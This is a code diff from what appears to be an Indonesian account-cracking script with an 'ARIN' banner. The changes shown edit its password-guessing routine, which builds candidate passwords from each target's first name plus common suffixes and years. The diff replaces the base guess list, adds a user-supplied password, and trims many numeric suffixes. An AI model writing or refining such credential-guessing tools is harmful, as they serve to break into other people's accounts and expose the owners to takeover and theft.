@@ -57,12 +57,12 @@ def KembaliKeLaptop(): MainMenu()
 
 #<-[ Logo-Banener ]->#
 def LogoBanner(): BersihkanLayar();_____animasi__berjalan_____(f'''\x1b[1;91m<------------------------------------------------------------>{X}\n  
-░░░░░█████╗░██████╗░██╗███╗░░██╗░░░░
-░░░░██╔══██╗██╔══██╗██║████╗░██║░░░░
-░░░░███████║██████╔╝██║██╔██╗██║░░░░
-░░░░██╔══██║██╔══██╗██║██║╚████║░░░░
-░░░░██║░░██║██║░░██║██║██║░╚███║░░░░
-░░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░░░░\n\x1b[1;91m<------------------------------------------------------------>{N}''')
+░█████╗░██████╗░██╗███╗░░██╗
+██╔══██╗██╔══██╗██║████╗░██║
+███████║██████╔╝██║██╔██╗██║
+██╔══██║██╔══██╗██║██║╚████║
+██║░░██║██║░░██║██║██║░╚███║
+╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚═╝░░╚══╝\n\x1b[1;91m<------------------------------------------------------------>{N}''')
 
 #<-[ Login-Cookies ]->#
 def LoginCookies():
@@ -292,7 +292,7 @@ def passwrd():
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
-			pwv = ['sayang','sayangku','cintaku','rinduku','sayang123']
+			pwv = ['kamu nanya','kamunanya','kata sandi']
 			if len(nmf)<6:
 				if len(frs)<3:
 					pass
@@ -326,6 +326,7 @@ def passwrd():
 					pwv.append(frs+'1234512345')
 					pwv.append(frs+'20052005')
 					pwv.append(frs+'qwer1234')
+					pwv.append(password)
 					pwv.append(frs+'11223344')
 					pwv.append(frs+'brtdy')
 					pwv.append(frs+'1990')
@@ -348,56 +349,6 @@ def passwrd():
 					pwv.append(frs+'2007')
 					pwv.append(frs+'2008')
 					pwv.append(frs+'2009')
-					pwv.append(frs+'12')
-					pwv.append(frs+'01')
-					pwv.append(frs+'02')
-					pwv.append(frs+'03')
-					pwv.append(frs+'04')
-					pwv.append(frs+'05')
-					pwv.append(frs+'06')
-					pwv.append(frs+'07')
-					pwv.append(frs+'08')
-					pwv.append(frs+'09')
-					pwv.append(frs+'10')
-					pwv.append(frs+'11')
-					pwv.append(frs+'13')
-					pwv.append(frs+'15')
-					pwv.append(frs+'14')
-					pwv.append(frs+'16')
-					pwv.append(frs+'17')
-					pwv.append(frs+'18')
-					pwv.append(frs+'19')
-					pwv.append(frs+'20')
-					pwv.append(frs+'21')
-					pwv.append(frs+'22')
-					pwv.append(frs+'23')
-					pwv.append(frs+'24')
-					pwv.append(frs+'25')
-					pwv.append(frs+'26')
-					pwv.append(frs+'27')
-					pwv.append(frs+'28')
-					pwv.append(frs+'29')
-					pwv.append(frs+'30')
-					pwv.append(frs+'31')
-					pwv.append(frs+'32')
-					pwv.append(frs+'33')
-					pwv.append(frs+'34')
-					pwv.append(frs+'35')
-					pwv.append(frs+'36')
-					pwv.append(frs+'37')
-					pwv.append(frs+'38')
-					pwv.append(frs+'39')
-					pwv.append(frs+'80')
-					pwv.append(frs+'81')
-					pwv.append(frs+'82')
-					pwv.append(frs+'83')
-					pwv.append(frs+'84')
-					pwv.append(frs+'85')
-					pwv.append(frs+'86')
-					pwv.append(frs+'87')
-					pwv.append(frs+'88')
-					pwv.append(frs+'89')
-					pwv.append(frs+'90')
 			else:
 				if len(frs)<3:
 					pwv.append(nmf)
@@ -431,6 +382,7 @@ def passwrd():
 					pwv.append(frs+'1234512345')
 					pwv.append(frs+'20052005')
 					pwv.append(frs+'qwer1234')
+					pwv.append(password)
 					pwv.append(frs+'11223344')
 					pwv.append(frs+'1990')
 					pwv.append(frs+'1991')
@@ -452,56 +404,6 @@ def passwrd():
 					pwv.append(frs+'2007')
 					pwv.append(frs+'2008')
 					pwv.append(frs+'2009')
-					pwv.append(frs+'12')
-					pwv.append(frs+'01')
-					pwv.append(frs+'02')
-					pwv.append(frs+'03')
-					pwv.append(frs+'04')
-					pwv.append(frs+'05')
-					pwv.append(frs+'06')
-					pwv.append(frs+'07')
-					pwv.append(frs+'08')
-					pwv.append(frs+'09')
-					pwv.append(frs+'10')
-					pwv.append(frs+'11')
-					pwv.append(frs+'13')
-					pwv.append(frs+'15')
-					pwv.append(frs+'14')
-					pwv.append(frs+'16')
-					pwv.append(frs+'17')
-					pwv.append(frs+'18')
-					pwv.append(frs+'19')
-					pwv.append(frs+'20')
-					pwv.append(frs+'21')
-					pwv.append(frs+'22')
-					pwv.append(frs+'23')
-					pwv.append(frs+'24')
-					pwv.append(frs+'25')
-					pwv.append(frs+'26')
-					pwv.append(frs+'27')
-					pwv.append(frs+'28')
-					pwv.append(frs+'29')
-					pwv.append(frs+'30')
-					pwv.append(frs+'31')
-					pwv.append(frs+'32')
-					pwv.append(frs+'33')
-					pwv.append(frs+'34')
-					pwv.append(frs+'35')
-					pwv.append(frs+'36')
-					pwv.append(frs+'37')
-					pwv.append(frs+'38')
-					pwv.append(frs+'39')
-					pwv.append(frs+'80')
-					pwv.append(frs+'81')
-					pwv.append(frs+'82')
-					pwv.append(frs+'83')
-					pwv.append(frs+'84')
-					pwv.append(frs+'85')
-					pwv.append(frs+'86')
-					pwv.append(frs+'87')
-					pwv.append(frs+'88')
-					pwv.append(frs+'89')
-					pwv.append(frs+'90')
 			if 'ya' in pwpluss:
 				for xpwd in pwnya:
 					pwv.append(xpwd)
